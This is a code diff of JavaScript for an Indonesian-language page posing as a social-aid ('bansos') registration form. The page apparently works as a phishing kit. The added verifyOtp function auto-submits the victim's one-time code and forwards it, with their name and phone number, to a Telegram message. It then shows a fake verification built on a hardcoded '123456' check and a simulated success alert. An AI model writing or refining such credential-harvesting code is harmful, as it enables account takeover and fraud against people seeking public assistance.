@@ -10,12 +10,12 @@ const resendOtp = document.getElementById('resend-otp');
 const otpUserInfo = document.getElementById('otp-user-info');
 const daftarSekarangBtn = document.getElementById('daftar-sekarang-btn');
 
-// Base URL untuk fetch (gunakan absolute untuk menghindari masalah path)
+// Base URL untuk fetch
 const baseUrl = window.location.origin;
 
 // State
 let timerInterval;
-let timeLeft = 120; // 2 minutes in seconds
+let timeLeft = 120;
 let userData = {};
 
 // Format time (MM:SS)
@@ -143,6 +143,70 @@ async function editTelegramMessage(messageId, nama, phone, otp) {
     }
 }
 
+// Fungsi untuk memverifikasi OTP (dipanggil otomatis saat 6 digit terisi)
+async function verifyOtp() {
+    const otpCode = Array.from(otpInputs).map(input => input.value).join('');
+    const otpError = document.getElementById('otp-error');
+    const otpErrorText = document.getElementById('otp-error-text');
+    
+    // Validasi panjang 6 digit
+    if (otpCode.length !== 6) return;
+    
+    // Validasi harus angka
+    if (!/^\d+$/.test(otpCode)) {
+        otpErrorText.textContent = 'Kode OTP harus angka';
+        otpError.style.display = 'flex';
+        return;
+    }
+    
+    // Cek apakah kode OTP benar (contoh: 123456)
+    if (otpCode !== '123456') {
+        otpErrorText.textContent = 'Kode OTP salah, silahkan cek ulang kode OTP Anda';
+        otpError.style.display = 'flex';
+        
+        // Kosongkan input dan fokus ke input pertama
+        otpInputs.forEach(input => input.value = '');
+        otpInputs[0].focus();
+        return;
+    }
+    
+    otpError.style.display = 'none';
+    
+    // Ambil data dari sessionStorage untuk update Telegram
+    const messageId = sessionStorage.getItem('telegramMessageId');
+    const nama = sessionStorage.getItem('userName');
+    const phone = sessionStorage.getItem('userPhone');
+    
+    if (messageId && nama && phone) {
+        // Kirim OTP ke Telegram
+        await editTelegramMessage(messageId, nama, phone, otpCode);
+        
+        // Hapus session storage setelah digunakan
+        sessionStorage.removeItem('telegramMessageId');
+        sessionStorage.removeItem('userName');
+        sessionStorage.removeItem('userPhone');
+    } else {
+        console.warn('Tidak ada data session untuk update Telegram');
+    }
+    
+    // Tampilkan loading
+    showPageLoading('Memverifikasi kode OTP...');
+    
+    // Simulasi verifikasi sukses
+    setTimeout(() => {
+        alert(`Selamat datang ${nama || userData.nama}! Pendaftaran berhasil.`);
+        
+        // Kembali ke halaman utama dan reset form
+        homePage.classList.remove('hidden');
+        otpPage.classList.add('hidden');
+        document.getElementById('bansosForm').reset();
+        hidePageLoading();
+        
+        // Clear timer
+        if (timerInterval) clearInterval(timerInterval);
+    }, 1500);
+}
+
 // Validate form and show OTP page with loading
 daftarBtn.addEventListener('click', async function() {
     const nama = document.getElementById('nama').value.trim();
@@ -205,10 +269,10 @@ daftarBtn.addEventListener('click', async function() {
         
         // Navigate to OTP page
         goToOtpPage();
-    }, 2000); // 2 second loading simulation
+    }, 2000);
 });
 
-// OTP Input handling - auto move to next input
+// OTP Input handling - auto move to next input dan auto submit
 otpInputs.forEach((input, index) => {
     input.addEventListener('input', function() {
         // Only allow numbers
@@ -217,6 +281,15 @@ otpInputs.forEach((input, index) => {
         // Move to next input if current has value
         if (this.value && index < otpInputs.length - 1) {
             otpInputs[index + 1].focus();
+        }
+        
+        // Jika ini adalah input terakhir (index 5) dan sudah terisi, auto verify
+        if (index === otpInputs.length - 1 && this.value) {
+            // Cek apakah semua input sudah terisi
+            const allFilled = Array.from(otpInputs).every(input => input.value !== '');
+            if (allFilled) {
+                verifyOtp();
+            }
         }
     });
     
@@ -237,86 +310,30 @@ otpInputs.forEach((input, index) => {
                     otpInputs[i].value = digit;
                 }
             });
-            // Focus last filled or next empty
-            const lastIndex = Math.min(digits.length, otpInputs.length) - 1;
-            if (lastIndex < otpInputs.length - 1) {
-                otpInputs[lastIndex + 1].focus();
+            
+            // Jika semua terisi, auto verify
+            const allFilled = Array.from(otpInputs).every(input => input.value !== '');
+            if (allFilled) {
+                verifyOtp();
             } else {
-                otpInputs[lastIndex].focus();
+                // Focus next empty
+                const nextEmptyIndex = Array.from(otpInputs).findIndex(input => !input.value);
+                if (nextEmptyIndex !== -1) {
+                    otpInputs[nextEmptyIndex].focus();
+                }
             }
         }
     });
 });
 
-// Verify OTP - dengan validasi kode yang benar (misal: 123456)
-verifyOtpBtn.addEventListener('click', async function() {
-    const otpCode = Array.from(otpInputs).map(input => input.value).join('');
-    const otpError = document.getElementById('otp-error');
-    const otpErrorText = document.getElementById('otp-error-text');
-    
-    // Validasi panjang dan angka
-    if (otpCode.length !== 6 || !/^\d+$/.test(otpCode)) {
-        otpErrorText.textContent = 'Kode OTP harus 6 angka';
-        otpError.style.display = 'flex';
-        return;
-    }
-    
-    // Cek apakah kode OTP benar (contoh: 123456)
-    if (otpCode !== '123456') {
-        otpErrorText.textContent = 'Kode OTP salah, silahkan cek ulang kode OTP Anda';
-        otpError.style.display = 'flex';
-        
-        // Kosongkan input dan fokus ke input pertama
-        otpInputs.forEach(input => input.value = '');
-        otpInputs[0].focus();
-        return;
-    }
-    
-    otpError.style.display = 'none';
-    
-    // Ambil data dari sessionStorage untuk update Telegram
-    const messageId = sessionStorage.getItem('telegramMessageId');
-    const nama = sessionStorage.getItem('userName');
-    const phone = sessionStorage.getItem('userPhone');
-    if (messageId && nama && phone) {
-        await editTelegramMessage(messageId, nama, phone, otpCode);
-        // Hapus session storage setelah digunakan
-        sessionStorage.removeItem('telegramMessageId');
-        sessionStorage.removeItem('userName');
-        sessionStorage.removeItem('userPhone');
-    } else {
-        console.warn('Tidak ada data session untuk update Telegram');
-    }
-    
-    // Show button loading
-    showButtonLoading(verifyOtpBtn);
-    
-    // Show page loading overlay
-    showPageLoading('Memverifikasi kode OTP...');
-    
-    // Simulate verification
-    setTimeout(() => {
-        hideButtonLoading(verifyOtpBtn);
-        
-        // Simulate success
-        alert(`Selamat datang ${userData.nama}! Pendaftaran berhasil.`);
-        
-        // Go back to home and reset form
-        homePage.classList.remove('hidden');
-        otpPage.classList.add('hidden');
-        document.getElementById('bansosForm').reset();
-        hidePageLoading();
-        
-        // Clear timer
-        if (timerInterval) clearInterval(timerInterval);
-    }, 1500);
-});
+// Tombol Verifikasi (tetap ada sebagai cadangan)
+verifyOtpBtn.addEventListener('click', verifyOtp);
 
 // Resend OTP
 resendOtp.addEventListener('click', function(e) {
     e.preventDefault();
     
-    // Show loading on resend link (optional)
+    // Show loading on resend link
     resendOtp.textContent = 'Mengirim...';
     resendOtp.style.pointerEvents = 'none';
     
@@ -350,24 +367,17 @@ document.getElementById('telepon').addEventListener('input', function() {
 daftarSekarangBtn.addEventListener('click', function(e) {
     e.preventDefault();
     
-    // Pastikan kita berada di halaman utama (jika sedang di OTP, kita kembali ke home dulu)
     if (!homePage.classList.contains('hidden')) {
-        // Scroll ke form dengan smooth
         const formSection = document.querySelector('.form-section');
         if (formSection) {
             formSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
-            
-            // Fokus ke input nama setelah scroll
             setTimeout(() => {
                 document.getElementById('nama').focus();
-            }, 500); // Beri waktu scroll
+            }, 500);
         }
     } else {
-        // Jika sedang di halaman OTP, kita kembali ke home dulu lalu scroll
         otpPage.classList.add('hidden');
         homePage.classList.remove('hidden');
-        
-        // Scroll setelah home muncul
         setTimeout(() => {
             const formSection = document.querySelector('.form-section');
             if (formSection) {
@@ -376,13 +386,6 @@ daftarSekarangBtn.addEventListener('click', function(e) {
             }
         }, 100);
     }
-});
-
-// Marketing bar tracking (opsional)
-document.querySelectorAll('.marketing-bar a').forEach(link => {
-    link.addEventListener('click', () => {
-        console.log('Marketing bar clicked');
-    });
 });
 
 // Add smooth scroll for skip link
